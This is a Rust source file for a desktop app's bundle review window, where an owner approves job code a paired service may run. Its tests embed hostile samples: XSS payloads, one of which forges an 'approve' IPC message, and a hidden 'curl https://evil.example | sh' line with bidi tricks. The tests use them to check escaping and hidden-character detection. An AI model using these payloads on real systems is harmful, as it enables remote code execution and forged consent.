//! The review window, the heart of consent (spec §5.5): a bundle shown in
//! full, verified against its hash, for the owner to approve or not.

use std::time::SystemTime;

use maud::{Markup, html};
use moil_agent::{Review, ServiceId};
use moil_bundle::{FileDiff, GpuRequirement, LineKind, LockedPackage, PackageSource};
use moil_proto::BundleHash;

use crate::format;
use crate::ipc::ReviewMessage;
use crate::page::{self, code, icon, link, visible};

/// One review window: which bundle it is for, and where the owner is in
/// reviewing it.
#[derive(Debug)]
pub struct ReviewWindow {
    service: ServiceId,
    service_name: String,
    hash: BundleHash,
    state: State,
    /// The page shown no longer matches `state`.
    stale: bool,
    /// The owner approved the bundle in this window.
    approved: bool,
}

#[derive(Debug)]
enum State {
    /// Fetching the bundle and checking it against its hash.
    Loading,
    Failed(String),
    Ready {
        review: Box<Review>,
        /// Approving or revoking, and waiting for the agent.
        busy: bool,
        error: Option<String>,
    },
}

/// What the app should do next for a review window.
#[derive(Debug)]
pub enum ReviewEffect {
    /// Approve exactly this reviewed bundle.
    Approve(Box<Review>),
    Revoke {
        service: ServiceId,
        hash: BundleHash,
    },
    Close,
}

impl ReviewWindow {
    /// A window for the bundle `hash` that the service `service` offers,
    /// waiting for [`loaded`](Self::loaded).
    pub fn new(service: ServiceId, service_name: impl Into<String>, hash: BundleHash) -> Self {
        Self {
            service,
            service_name: service_name.into(),
            hash,
            state: State::Loading,
            stale: false,
            approved: false,
        }
    }

    /// Whether the owner approved the bundle here. A window closed any
    /// other way leaves the decision for later.
    pub fn approved(&self) -> bool {
        self.approved
    }

    /// Whether the page shown is out of date and should be rendered again.
    /// Clicking Approve or Revoke doesn't make it so: the page shows that
    /// it is busy by itself, which keeps the owner's place on the page.
    pub fn needs_render(&mut self) -> bool {
        std::mem::take(&mut self.stale)
    }

    /// The service and bundle this window is for.
    pub fn subject(&self) -> (&ServiceId, BundleHash) {
        (&self.service, self.hash)
    }

    pub fn title(&self) -> String {
        match &self.state {
            State::Ready { review, .. } => {
                let manifest = review.bundle.manifest();
                format!(
                    "Review {} {} — {}",
                    manifest.name,
                    format::one_line(&manifest.version, 32),
                    format::one_line(&self.service_name, 32)
                )
            }
            _ => format!(
                "Review a bundle from {}",
                format::one_line(&self.service_name, 32)
            ),
        }
    }

    /// The agent fetched and verified the bundle, or couldn't. A review of
    /// anything other than the requested bundle is refused.
    pub fn loaded(&mut self, result: Result<Review, String>) {
        if !matches!(self.state, State::Loading) {
            return;
        }
        self.stale = true;
        self.state = match result {
            Ok(review)
                if review.bundle.hash() != self.hash || review.service.id != self.service =>
            {
                State::Failed(format!(
                    "moil asked {} for bundle {} but got a different one, so it isn't shown.",
                    self.service_name, self.hash
                ))
            }
            Ok(review) => State::Ready {
                review: Box::new(review),
                busy: false,
                error: None,
            },
            Err(error) => State::Failed(error),
        };
    }

    /// Handles a message from the page. Approving and revoking only ever
    /// apply to the bundle the page shows, named by its full hash.
    pub fn on_message(&mut self, message: ReviewMessage) -> Option<ReviewEffect> {
        let State::Ready {
            review,
            busy,
            error,
        } = &mut self.state
        else {
            return matches!(message, ReviewMessage::Close {}).then_some(ReviewEffect::Close);
        };
        match message {
            ReviewMessage::Close {} => Some(ReviewEffect::Close),
            _ if *busy => None,
            ReviewMessage::Approve { hash } | ReviewMessage::Revoke { hash }
                if hash != review.bundle.hash() =>
            {
                tracing::warn!(%hash, shown = %review.bundle.hash(), "the review page named another bundle");
                *error = Some(
                    "The page asked about a different bundle than the one it shows, so nothing changed."
                        .into(),
                );
                self.stale = true;
                None
            }
            ReviewMessage::Approve { .. } if !review.approved => {
                *busy = true;
                *error = None;
                Some(ReviewEffect::Approve(review.clone()))
            }
            ReviewMessage::Revoke { hash } if review.approved => {
                *busy = true;
                *error = None;
                Some(ReviewEffect::Revoke {
                    service: self.service.clone(),
                    hash,
                })
            }
            ReviewMessage::Approve { .. } | ReviewMessage::Revoke { .. } => None,
        }
    }

    /// The agent finished approving or revoking: the window closes, or
    /// shows why it couldn't.
    pub fn finished(&mut self, result: Result<(), String>) -> Option<ReviewEffect> {
        let State::Ready {
            review,
            busy,
            error,
        } = &mut self.state
        else {
            return None;
        };
        if !*busy {
            return None;
        }
        *busy = false;
        match result {
            Ok(()) => {
                self.approved = !review.approved;
                Some(ReviewEffect::Close)
            }
            Err(e) => {
                *error = Some(e);
                self.stale = true;
                None
            }
        }
    }

    /// The page for the window's current state. `now` dates earlier
    /// approvals.
    pub fn render(&self, now: SystemTime) -> String {
        let (class, body) = match &self.state {
            State::Loading => ("dialog", loading(&self.service_name)),
            State::Failed(error) => ("dialog", failed(&self.service_name, error)),
            State::Ready {
                review,
                busy,
                error,
            } => ("review", ready(review, *busy, error.as_deref(), now)),
        };
        page::document(&self.title(), class, body)
    }
}

fn loading(service_name: &str) -> Markup {
    html! {
        main.dialog {
            div.centered {
                span.spinner {}
                h1 { "Fetching the bundle from " (visible(service_name)) }
                p.muted { "moil checks every file against the bundle's hash before showing it." }
            }
        }
        footer.actions { span.spacer {} button data-action="close" { "Cancel" } }
    }
}

fn failed(service_name: &str, error: &str) -> Markup {
    html! {
        main.dialog {
            div.notice {
                span.notice-icon.bad { (icon::error()) }
                h1 { "Couldn't open this bundle from " (visible(service_name)) }
                p.message { (visible(error)) }
            }
        }
        footer.actions { span.spacer {} button.primary data-action="close" { "Close" } }
    }
}

fn ready(review: &Review, busy: bool, error: Option<&str>, now: SystemTime) -> Markup {
    let bundle = &review.bundle;
    let manifest = bundle.manifest();
    let service = &review.service;
    let name = service.name.as_str();
    let hash = bundle.hash().to_string();
    let approved_at = |hash: BundleHash| {
        service
            .approvals
            .iter()
            .find(|a| a.hash == hash)
            .map(|a| format::ago(a.approved_at, now))
    };
    let diffs = review.diff();
    let packages = bundle.packages();
    let unusual = packages.iter().filter(|p| is_unusual(p)).count();
    let hidden: Vec<_> = bundle
        .files()
        .map(|(file, text)| (file, page::hidden_chars(text)))
        .filter(|&(_, n)| n > 0)
        .collect();

    html! {
        main {
            div.hero {
                p.eyebrow {
                    @if review.previous.is_some() { "Update from " } @else { "Job bundle from " }
                    (visible(name))
                }
                h1 { (visible(&manifest.name)) " " span.version { (visible(&manifest.version)) } }
                @if let Some(description) = &manifest.description {
                    p.lede { (visible(description)) }
                }
                p.from {
                    "Offered by " strong { (visible(name)) } " at "
                    (link(service.base_url.as_str(), visible(service.base_url.as_str())))
                    @if service.is_insecure() {
                        " " span.badge.warn { "unencrypted http" }
                    }
                }
            }
            div.stack {
                @if review.approved {
                    div.callout.good {
                        (icon::check())
                        div {
                            strong {
                                "You approved this bundle"
                                @if let Some(when) = approved_at(bundle.hash()) { " " (when) }
                                "."
                            }
                            p { (visible(name)) " can send it jobs. Revoke the approval to stop that." }
                        }
                    }
                } @else if let Some(previous) = &review.previous {
                    div.callout.info {
                        (icon::info())
                        div {
                            strong {
                                "This replaces " (visible(&previous.manifest().name)) " "
                                (visible(&previous.manifest().version))
                                ", which you approved"
                                @if let Some(when) = approved_at(previous.hash()) { " " (when) }
                                "."
                            }
                            p { "What changed comes first, then every file in full." }
                        }
                    }
                }
                div.callout.warn {
                    (icon::warning())
                    div {
                        strong { "Approving lets " (visible(name)) " run this code on this Mac, with your permissions." }
                        p {
                            "It can read and change your files, use the network and use this Mac's hardware. "
                            "moil doesn't sandbox jobs yet, so approve only code you have read, from a service you trust."
                        }
                    }
                }
                @if !hidden.is_empty() {
                    div.callout.bad {
                        (icon::error())
                        div {
                            strong { "This bundle contains invisible or text-reordering characters." }
                            p {
                                "They can make code look different from what runs. Each is marked like "
                                span.hc { "\\u{202e}" } " where it appears: "
                                @for (i, (file, n)) in hidden.iter().enumerate() {
                                    @if i > 0 { ", " }
                                    (format::count(*n, "character")) " in " code { (file) }
                                }
                                "."
                            }
                        }
                    }
                }
                dl.facts {
                    dt { "Bundle hash" }
                    dd { span.hash { (hash) } }
                    dt { "Check it" }
                    dd {
                        code.command { (Review::VERIFY_COMMAND) }
                        span.hint { "Run it in a folder holding these three files; it prints the hash above." }
                    }
                    dt { "Needs" }
                    dd { (resources(manifest)) }
                    @if !manifest.assets.is_empty() {
                        dt { "Downloads" }
                        dd { (assets_summary(manifest)) }
                    }
                    dt { "Installs" }
                    dd {
                        (format::count(packages.len(), "Python package"))
                        @if unusual > 0 {
                            " " span.badge.warn { (unusual) " not from PyPI" }
                        }
                    }
                }
            }
            nav.toc {
                @if diffs.is_some() { a href="#changes" { "Changes" } }
                a href="#job-py" { "job.py" }
                a href="#packages" { "Packages" }
                a href="#lockfile" { "job.py.lock" }
                a href="#manifest" { "manifest.json" }
            }
            @if let (Some(previous), Some(diffs)) = (&review.previous, &diffs) {
                section #changes {
                    header {
                        h2 { "Changes since " (visible(&previous.manifest().version)) }
                    }
                    @for diff in diffs { (file_diff(diff)) }
                }
            }
            section #job-py {
                header {
                    h2 { "job.py" }
                    span.count { (format::count(page::lines(bundle.script()).count(), "line")) }
                }
                p { "The script moil runs. Its first lines declare the Python version and the packages it needs." }
                (code(bundle.script()))
            }
            section #packages {
                header {
                    h2 { "Packages" }
                    span.count { (packages.len()) }
                }
                p { "Everything job.py.lock pins. uv installs exactly these, checking each file's hash." }
                (package_table(packages))
            }
            section #lockfile {
                header {
                    h2 { "job.py.lock" }
                    span.count { (format::count(page::lines(bundle.lockfile()).count(), "line")) }
                }
                (code(bundle.lockfile()))
            }
            section #manifest {
                header { h2 { "manifest.json" } }
                (manifest_section(bundle.manifest(), bundle.manifest_text()))
            }
        }
        footer.actions {
            @if let Some(error) = error {
                p.note.bad { (visible(error)) }
            } @else {
                p.note {
                    "Approval covers exactly this bundle. If " (visible(name))
                    " changes any of it, moil asks again."
                }
            }
            @if review.approved {
                button data-action="close" disabled[busy] { "Close" }
                button.danger data-action="revoke" data-hash=(hash) data-busy="Revoking…" disabled[busy] {
                    @if busy { "Revoking…" } @else { "Revoke Approval" }
                }
            } @else {
                button data-action="close" disabled[busy] { "Not Now" }
                button.primary data-action="approve" data-hash=(hash) data-busy="Approving…" disabled[busy] {
                    @if busy { "Approving…" } @else { "Approve" }
                }
            }
        }
    }
}

fn resources(manifest: &moil_bundle::Manifest) -> Markup {
    let memory = manifest.resources.memory_bytes.map(format::memory);
    let gpu = manifest.resources.gpu.map(|gpu| match gpu {
        GpuRequirement::None => "no GPU",
        GpuRequirement::Optional => "a GPU if there is one",
        GpuRequirement::Required => "a GPU",
    });
    html! {
        @match (memory, gpu) {
            (None, None) => span.muted { "Nothing stated" },
            (Some(memory), None) => { (memory) " of memory" },
            (None, Some(gpu)) => { (gpu) },
            (Some(memory), Some(gpu)) => { (memory) " of memory, " (gpu) },
        }
    }
}

fn assets_summary(manifest: &moil_bundle::Manifest) -> Markup {
    let assets = &manifest.assets;
    let total: u64 = assets.values().filter_map(|a| a.size_bytes).sum();
    let all_sized = assets.values().all(|a| a.size_bytes.is_some());
    html! {
        (format::count(assets.len(), "file"))
        @if total > 0 {
            ", " @if !all_sized { "at least " } (format::size(total))
        }
        ", each checked against its SHA-256"
    }
}

/// Packages that don't come from PyPI deserve a second look.
fn is_unusual(package: &LockedPackage) -> bool {
    !matches!(&package.source, PackageSource::Registry(index) if is_pypi(index))
}

fn is_pypi(index: &str) -> bool {
    index.trim_end_matches('/') == "https://pypi.org/simple"
}

fn package_table(packages: &[LockedPackage]) -> Markup {
    html! {
        @if packages.is_empty() {
            p.muted { "The lockfile pins no packages." }
        } @else {
            table.list {
                thead { tr { th { "Package" } th { "Version" } th { "Source" } } }
                tbody {
                    @for package in packages {
                        tr.flagged[is_unusual(package)] {
                            td.name {
                                @match package.link() {
                                    Some(url) => (link(&url, visible(&package.name))),
                                    None => (visible(&package.name)),
                                }
                            }
                            td.version {
                                @match &package.version {
                                    Some(version) => (visible(version)),
                                    None => span.muted { "—" },
                                }
                            }
                            td.source { (source(&package.source)) }
                        }
                    }
                }
            }
        }
    }
}

fn source(source: &PackageSource) -> Markup {
    let (badge, detail, linked) = match source {
        PackageSource::Registry(index) if is_pypi(index) => return html! { span.muted { "PyPI" } },
        PackageSource::Registry(index) => ("Other index", index, true),
        PackageSource::Git(url) => ("Git", url, true),
        PackageSource::Url(url) => ("Direct download", url, true),
    };
    html! {
        span.badge.warn { (badge) } " "
        @if linked { (link(detail, visible(detail))) } @else { span.mono { (visible(detail)) } }
    }
}

fn manifest_section(manifest: &moil_bundle::Manifest, text: &str) -> Markup {
    html! {
        p { "What the bundle says about itself. moil checked it strictly: it has no fields moil doesn't understand." }
        dl.facts {
            dt { "Name" } dd.mono { (visible(&manifest.name)) }
            dt { "Version" } dd.mono { (visible(&manifest.version)) }
            @if let Some(description) = &manifest.description {
                dt { "Description" } dd { (visible(description)) }
            }
            dt { "Resources" } dd { (resources(manifest)) }
        }
        @if !manifest.assets.is_empty() {
            div.file {
                header { h3 { "Assets" } span.muted { (assets_summary(manifest)) } }
                ul.assets {
                    @for (name, asset) in &manifest.assets {
                        li {
                            div.head {
                                span.name { (visible(name)) }
                                span.muted {
                                    @match asset.size_bytes {
                                        Some(size) => (format::size(size)),
                                        None => "size not stated",
                                    }
                                }
                            }
                            div.url { (link(&asset.url, visible(&asset.url))) }
                            div.sha { "sha256 " (visible(&asset.sha256)) }
                        }
                    }
                }
            }
        }
        div.file {
            header { h3 { "Full text" } }
            (code(text))
        }
    }
}

fn file_diff(diff: &FileDiff) -> Markup {
    let (added, removed) = diff.stats();
    html! {
        div.file {
            header {
                h3.file-name { (diff.name) }
                @if diff.is_unchanged() {
                    span.muted { "unchanged" }
                } @else {
                    span.stat-add { "+" (added) }
                    span.stat-del { "−" (removed) }
                }
            }
            @if !diff.is_unchanged() {
                div.code-wrap {
                    table.diff {
                        @for (i, hunk) in diff.hunks.iter().enumerate() {
                            @if i > 0 { tr.gap { td colspan="4" { "⋯" } } }
                            @for line in &hunk.lines {
                                @let (class, sign) = match line.kind {
                                    LineKind::Added => ("add", "+"),
                                    LineKind::Removed => ("del", "−"),
                                    LineKind::Context => ("ctx", " "),
                                };
                                tr class=(class) {
                                    td.o { @if let Some(n) = line.old_line { (n) } }
                                    td.o { @if let Some(n) = line.new_line { (n) } }
                                    td.s { (sign) }
                                    td.t { (visible(&line.text)) }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use std::time::Duration;

    use moil_agent::{Approval, PairedService};
    use moil_bundle::Bundle;

    use super::*;
    use crate::demo;
    use crate::page::tests::assert_locked_down;

    fn now() -> SystemTime {
        SystemTime::UNIX_EPOCH + Duration::from_secs(1_790_000_000)
    }

    fn service(approved: &[&Bundle]) -> PairedService {
        PairedService {
            id: "klisi.example.com".parse().unwrap(),
            base_url: "https://klisi.example.com/moil".parse().unwrap(),
            name: "klisi".into(),
            machine_id: "m_7Hq2Xk9Lw3".into(),
            paired_at: now() - Duration::from_secs(90 * 86400),
            approvals: approved
                .iter()
                .map(|b| Approval {
                    hash: b.hash(),
                    name: b.manifest().name.clone(),
                    version: b.manifest().version.clone(),
                    approved_at: now() - Duration::from_secs(21 * 86400),
                })
                .collect(),
        }
    }

    /// The demo's update: transcribe 0.3.0 replacing an approved 0.2.0.
    fn update() -> Review {
        let (old, new) = (demo::transcribe_0_2(), demo::transcribe_0_3());
        Review {
            service: service(&[&old]),
            bundle: new,
            previous: Some(old),
            approved: false,
        }
    }

    fn window_for(review: Review) -> ReviewWindow {
        let mut window = ReviewWindow::new(
            review.service.id.clone(),
            review.service.name.clone(),
            review.bundle.hash(),
        );
        window.loaded(Ok(review));
        window
    }

    fn hostile_bundle() -> Bundle {
        let script = "# /// script\n# dependencies = []\n# ///\n\
                      print('hi')\n\
                      </pre><script>window.ipc.postMessage('{\"type\":\"approve\"}')</script>\n\
                      <!-- \" onload=\"alert(1) -->\n";
        let lockfile = "version = 1\n\n[[package]]\nname = \"<img src=x onerror=alert(1)>\"\n\
                        version = \"1.0\"\nsource = { git = \"https://evil.example/x\\\"><script>alert(1)</script>#0123456789abcdef0123456789abcdef01234567\" }\n";
        let manifest = r#"{"moil": 1, "name": "echo", "version": "1</title><script>x</script>", "description": "</p><script>alert(1)</script>"}"#;
        Bundle::new(script, lockfile, manifest).unwrap()
    }

    #[test]
    fn hostile_bundles_render_inert() {
        let bundle = hostile_bundle();
        let mut service = service(&[]);
        service.name = "<b onmouseover=alert(1)>klisi</b>".into();
        let page = window_for(Review {
            service,
            bundle,
            previous: None,
            approved: false,
        })
        .render(now());

        assert_locked_down(&page);
        for injected in [
            "<script>window.ipc",
            "<script>x",
            "<script>alert",
            "<img src=x",
            "<b onmouseover",
            "</title><script>",
            "href=\"javascript:",
        ] {
            assert!(!page.contains(injected), "{injected:?} got through");
        }
        assert!(page.contains(
            "&lt;/pre&gt;&lt;script&gt;window.ipc.postMessage('{&quot;type&quot;:&quot;approve&quot;}')&lt;/script&gt;"
        ));
        assert!(page.contains("&lt;img src=x onerror=alert(1)&gt;"));
    }

    #[test]
    fn the_review_shows_everything_the_owner_consents_to() {
        let review = update();
        let bundle = review.bundle.clone();
        let page = window_for(review).render(now());
        assert_locked_down(&page);

        // Who asks, and for what, from the verified manifest.
        assert!(page.contains("Offered by <strong>klisi</strong>"));
        assert!(page.contains(r#"<a href="https://klisi.example.com/moil">"#));
        assert!(page.contains("transcribe <span class=\"version\">0.3.0</span>"));
        assert!(page.contains("Transcribe a meeting recording with speaker labels"));

        // The full hash, and how to check it.
        assert!(page.contains(&format!(r#"<span class="hash">{}</span>"#, bundle.hash())));
        assert!(page.contains(Review::VERIFY_COMMAND));

        // The plain warning.
        assert!(page.contains("run this code on this Mac, with your permissions."));
        assert!(page.contains("moil doesn't sandbox jobs yet"));

        // Every file in full: each line of each file is on the page.
        for (name, text) in bundle.files() {
            for line in page::lines(text).filter(|l| !l.trim().is_empty()) {
                let shown = visible(line).into_string();
                assert!(page.contains(&shown), "{name}: {line:?} is missing");
            }
        }

        // The packages, with versions, sources and links; the git one flagged.
        assert!(
            page.contains(
                r#"<a href="https://pypi.org/project/ctranslate2/4.8.2/">ctranslate2</a>"#
            )
        );
        assert!(
            page.contains(
                r#"<a href="https://pypi.org/project/sherpa-onnx/1.13.8/">sherpa-onnx</a>"#
            )
        );
        let git_row = page
            .split("<tr")
            .find(|row| row.contains(">faster-whisper<"))
            .unwrap();
        assert!(git_row.starts_with(r#" class="flagged""#), "{git_row}");
        assert!(git_row.contains(r#"<span class="badge warn">Git</span>"#));
        assert!(git_row.contains("https://github.com/SYSTRAN/faster-whisper?rev=ed9a06cd"));
        assert!(page.contains(r#"<span class="badge warn">1 not from PyPI</span>"#));
        assert_eq!(page.matches(r#"<tr class="flagged">"#).count(), 1);

        // The manifest's assets and resources.
        let (name, asset) = bundle.manifest().assets.iter().next().unwrap();
        assert!(page.contains(&format!(r#"<span class="name">{name}</span>"#)));
        assert!(page.contains(&format!(r#"<a href="{}">"#, asset.url)));
        assert!(page.contains(&format!("sha256 {}", asset.sha256)));
        assert!(page.contains("40.3 MB"));
        assert!(page.contains("6 GiB of memory, a GPU if there is one"));

        // And the choice, bound to the exact hash.
        assert!(page.contains(&format!(
            r#"data-action="approve" data-hash="{}""#,
            bundle.hash()
        )));
        assert!(page.contains(r#"data-action="close""#));
    }

    #[test]
    fn an_update_shows_what_changed_first() {
        let page = window_for(update()).render(now());
        let changes = page.find(r#"<section id="changes">"#).unwrap();
        for later in [r#"id="job-py""#, r#"id="packages""#, r#"id="lockfile""#] {
            assert!(changes < page.find(later).unwrap());
        }
        assert!(page.contains("This replaces transcribe 0.2.0, which you approved 3 weeks ago."));
        assert!(page.contains("Changes since 0.2.0"));

        let diff = &page[changes..page.find(r#"id="job-py""#).unwrap()];
        assert!(diff.contains(
            r#"<tr class="del"><td class="o">3</td><td class="o"></td><td class="s">−</td><td class="t"># dependencies = [&quot;faster-whisper==1.1.1&quot;]</td></tr>"#
        ));
        assert!(diff.contains(
            r#"<tr class="add"><td class="o"></td><td class="o">6</td><td class="s">+</td><td class="t">#     &quot;sherpa-onnx==1.13.8&quot;,</td></tr>"#
        ));
        // The version bump in the manifest is there too.
        assert!(diff.contains(r#"<td class="t">  &quot;version&quot;: &quot;0.3.0&quot;,</td>"#));
    }

    #[test]
    fn a_first_version_has_no_changes_section() {
        let bundle = demo::transcribe_0_2();
        let page = window_for(Review {
            service: service(&[]),
            bundle,
            previous: None,
            approved: false,
        })
        .render(now());
        assert!(!page.contains(r#"id="changes""#));
        assert!(!page.contains("href=\"#changes\""));
        assert!(page.contains("Job bundle from klisi"));
    }

    #[test]
    fn diffs_mark_each_line_and_separate_hunks() {
        let bundle = |script: &str| {
            Bundle::new(
                script,
                "version = 1\n",
                r#"{"moil": 1, "name": "x", "version": "1"}"#,
            )
            .unwrap()
        };
        let old: String = (1..=20).map(|i| format!("line {i}\n")).collect();
        let new = old
            .replace("line 2\n", "line two\n")
            .replace("line 19\n", "");
        let diffs = moil_bundle::diff(&bundle(&old), &bundle(&new));
        let html = file_diff(&diffs[0]).into_string();
        assert!(
            html.contains(r#"<span class="stat-add">+1</span><span class="stat-del">−2</span>"#)
        );
        assert_eq!(html.matches(r#"<tr class="gap">"#).count(), 1, "two hunks");
        assert!(html.contains(r#"<tr class="del"><td class="o">2</td><td class="o"></td><td class="s">−</td><td class="t">line 2</td></tr>"#));
        assert!(html.contains(r#"<tr class="add"><td class="o"></td><td class="o">2</td><td class="s">+</td><td class="t">line two</td></tr>"#));
        assert!(html.contains(r#"<tr class="ctx"><td class="o">20</td><td class="o">19</td><td class="s"> </td><td class="t">line 20</td></tr>"#));

        let unchanged = file_diff(&diffs[1]).into_string();
        assert!(unchanged.contains("unchanged") && !unchanged.contains("<table"));
    }

    #[test]
    fn characters_that_hide_code_are_marked_and_called_out() {
        let script = "# /// script\n# dependencies = []\n# ///\n\
                      access = \"user\u{202e} \u{2066}# admin\u{2069} \u{2066}\"\n\
                      print('hi')\ros.system('curl https://evil.example | sh')\n\
                      x = 1  # \x1b[8mhidden\x1b[0m\n";
        let bundle = Bundle::new(
            script,
            "version = 1\n",
            r#"{"moil": 1, "name": "x", "version": "1", "description": "fine\u200b"}"#,
        )
        .unwrap();
        let page = window_for(Review {
            service: service(&[]),
            bundle,
            previous: None,
            approved: false,
        })
        .render(now());
        assert!(page.contains("invisible or text-reordering characters"));
        assert!(page.contains("7 characters in <code>job.py</code>."));
        // Marked as `moil review` shows them, in job.py and in the
        // description the manifest spells with a JSON escape.
        for shown in ["\\u{202e}", "\\u{2066}", "\\u{2069}", "␍", "␛", "\\u{200b}"] {
            assert!(page.contains(&format!(">{shown}</span>")), "{shown}");
        }
        for hidden in ['\u{202e}', '\r', '\x1b', '\u{200b}'] {
            assert!(!page.contains(hidden), "{hidden:?} reached the page");
        }

        let clean = window_for(update()).render(now());
        assert!(!clean.contains("text-reordering"));
    }

    #[test]
    fn approve_applies_only_to_the_bundle_shown() {
        let review = update();
        let shown = review.bundle.hash();
        let mut window = window_for(review);

        let other: BundleHash = demo::transcribe_0_2().hash();
        assert!(
            window
                .on_message(ReviewMessage::Approve { hash: other })
                .is_none()
        );
        assert!(window.needs_render());
        let page = window.render(now());
        assert!(page.contains("a different bundle than the one it shows, so nothing changed"));

        match window.on_message(ReviewMessage::Approve { hash: shown }) {
            Some(ReviewEffect::Approve(review)) => assert_eq!(review.bundle.hash(), shown),
            other => panic!("expected approval, got {other:?}"),
        }
        assert!(
            !window.needs_render(),
            "the page shows it is busy by itself"
        );
        // A second click while the agent works does nothing.
        assert!(
            window
                .on_message(ReviewMessage::Approve { hash: shown })
                .is_none()
        );
        let busy = window.render(now());
        assert!(busy.contains("Approving…"));
        assert!(
            !busy.contains("a different bundle"),
            "the old error is gone"
        );

        assert!(matches!(window.finished(Ok(())), Some(ReviewEffect::Close)));
    }

    #[test]
    fn a_failed_approval_is_explained_and_can_be_retried() {
        let review = update();
        let hash = review.bundle.hash();
        let mut window = window_for(review);
        window.on_message(ReviewMessage::Approve { hash });
        assert!(
            window
                .finished(Err("couldn't reach klisi: timed out".into()))
                .is_none()
        );
        let page = window.render(now());
        assert!(page.contains(r#"<p class="note bad">couldn't reach klisi: timed out</p>"#));
        assert!(!page.contains(" disabled>"));
        assert!(matches!(
            window.on_message(ReviewMessage::Approve { hash }),
            Some(ReviewEffect::Approve(_))
        ));
    }

    #[test]
    fn an_approved_bundle_offers_revoking_instead() {
        let bundle = demo::transcribe_0_2();
        let hash = bundle.hash();
        let mut window = window_for(Review {
            service: service(&[&bundle]),
            bundle,
            previous: None,
            approved: true,
        });
        let page = window.render(now());
        assert!(page.contains("You approved this bundle 3 weeks ago."));
        assert!(page.contains(&format!(r#"data-action="revoke" data-hash="{hash}""#)));
        assert!(!page.contains(r#"data-action="approve""#));

        assert!(window.on_message(ReviewMessage::Approve { hash }).is_none());
        assert!(matches!(
            window.on_message(ReviewMessage::Revoke { hash }),
            Some(ReviewEffect::Revoke { hash: h, .. }) if h == hash
        ));
    }

    #[test]
    fn a_review_of_another_bundle_is_not_shown() {
        let review = update();
        let mut window = ReviewWindow::new(
            review.service.id.clone(),
            "klisi",
            demo::transcribe_0_2().hash(),
        );
        window.loaded(Ok(review));
        let page = window.render(now());
        assert!(page.contains("got a different one, so it isn't shown"));
        assert!(!page.contains("data-action=\"approve\""));
    }

    #[test]
    fn loading_and_failure_pages_let_the_owner_leave() {
        let mut window = ReviewWindow::new(
            "klisi.example.com".parse().unwrap(),
            "klisi",
            demo::transcribe_0_3().hash(),
        );
        assert!(
            window
                .render(now())
                .contains("Fetching the bundle from klisi")
        );
        assert!(
            window
                .on_message(ReviewMessage::Approve {
                    hash: demo::transcribe_0_3().hash()
                })
                .is_none()
        );
        window.loaded(Err("the service has no bundle 0d8b…".into()));
        let page = window.render(now());
        assert_locked_down(&page);
        assert!(page.contains("the service has no bundle 0d8b…"));
        assert!(matches!(
            window.on_message(ReviewMessage::Close {}),
            Some(ReviewEffect::Close)
        ));
    }
}
